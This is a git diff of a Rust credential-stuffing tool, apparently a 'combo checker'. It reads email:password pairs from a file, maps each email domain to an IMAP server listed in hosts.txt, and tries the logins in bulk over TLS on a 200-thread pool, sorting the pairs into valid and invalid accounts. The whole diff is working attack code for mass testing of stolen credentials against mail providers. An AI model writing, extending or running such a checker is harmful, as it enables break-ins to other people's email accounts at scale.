@@ -1,15 +1,19 @@
 use std::{env, fs::{self, File}, io::{self, BufRead}, path::Path, time::Duration, thread};
+use std::net::{IpAddr, Ipv4Addr, SocketAddr, TcpStream};
+use std::str::FromStr;
 use colored::Colorize;
+use native_tls::TlsConnector;
 use sinner::Sin;
 use threadpool::ThreadPool;
-use tokio::runtime::Runtime;
 
-fn valid_mail(username: &str, password: &str) -> imap::error::Result<Option<String>> {
-    let domain = ""; // TODO
-    let client = imap::ClientBuilder::new(domain, 993).native_tls()?;
+fn valid_mail(mail: &str, password: &str, server: &str, port: u16) -> imap::error::Result<Option<String>> {
+    let client = imap::ClientBuilder::new(server, port)
+        .native_tls()?;
+
     let mut imap_session = client
-        .login(username, password)
+        .login(mail, password)
         .map_err(|e| e.0)?;
+
     imap_session.logout().unwrap();
     Ok(Some("OK".to_string()))
 }
@@ -25,7 +29,7 @@ fn main_worker(input: &String, output: &String, resume: bool) {
     let output_file = File::create(output_path)
         .expect("Failed to create Output file".red().trim());
 
-    let hosts: Vec<(String, i32)> = init_hosts();
+    let hosts: Sin<Vec<(String, String, u16)>> = Sin::new(init_hosts());
     if hosts.is_empty() {
         println!("{}", "Hostがありません".red());
         return
@@ -36,37 +40,40 @@ fn main_worker(input: &String, output: &String, resume: bool) {
         start_line = find_last_line();
     }
 
-    let runtime = Runtime::new().unwrap();
-    let pool = ThreadPool::new(100);
+    let pool = ThreadPool::new(200);
     let mut valid: Sin<Vec<String>> = Sin::new(vec![]);
     let mut invalid: Sin<Vec<String>> = Sin::new(vec![]);
 
     if let Ok(lines) = read_lines(input_path) {
-        runtime.block_on(async move {
-            for (i, line) in lines.enumerate() {
-                if i <= start_line { continue }
-                if let Ok(combo) = line {
-                    pool.execute(move || {
-                        let split: Vec<&str> = combo.split(":").collect();
-                        let username = split.get(0).unwrap();
-                        let password = split.get(1).unwrap();
-                        if valid_mail(username, password).is_ok() {
-                            println!("{}", format!("Valid: {}", combo).green());
-                            valid.push(combo);
-                        } else {
-                            println!("{}", format!("Invalid: {}", combo).bright_red());
-                            invalid.push(combo);
-                        }
-                    });
-                }
+        for (i, line) in lines.enumerate() {
+            if i <= start_line { continue }
+            if let Ok(combo) = line {
+                pool.execute(move || {
+                    let split: Vec<&str> = combo.split(":").collect();
+                    let mail = split.get(0).unwrap();
+                    let password = split.get(1).unwrap();
 
-                thread::sleep(Duration::from_millis(20));
+                    let mail_split: Vec<&str> = mail.split("@").collect();
+                    let found = hosts.iter().find(|(host, _server, _port)|
+                        host.eq(mail_split.get(1).unwrap()));
+                    if found.is_none() { return }
+                    let (_, server, port) = found.unwrap();
+                    if valid_mail(mail, password, server, *port).is_ok() {
+                        println!("{}", format!("Valid: {}", combo).green());
+                        valid.push(combo);
+                    } else {
+                        println!("{}", format!("Invalid: {}", combo).bright_red());
+                        invalid.push(combo);
+                    }
+                });
             }
-        });
+
+            thread::sleep(Duration::from_millis(10));
+        }
     }
 
+    loop { if pool.active_count() <= 0 { break } }
     println!("Valid: {}, Invalid: {}", valid.len(), invalid.len());
-    loop {}
 }
 
 fn find_last_line() -> usize {
@@ -78,14 +85,18 @@ fn find_last_line() -> usize {
     return 0
 }
 
-fn init_hosts() -> Vec<(String, String, i32)> {
-    let mut hosts: Vec<(String, String, i32)> = vec![];
+fn init_hosts() -> Vec<(String, String, u16)> {
+    let mut hosts: Vec<(String, String, u16)> = vec![];
     let path = Path::new("hosts.txt");
     if !path.exists() { return hosts }
     if let Ok(lines) = read_lines(path) {
         for line in lines {
             if let Ok(host) = line {
                 let split: Vec<&str> = host.split(":").collect();
+                if split.len() < 3 {
+                    println!("Invalid host: {}", host);
+                    continue
+                }
                 hosts.push((
                     split.get(0).unwrap().to_string(),
                     split.get(1).unwrap().to_string(),
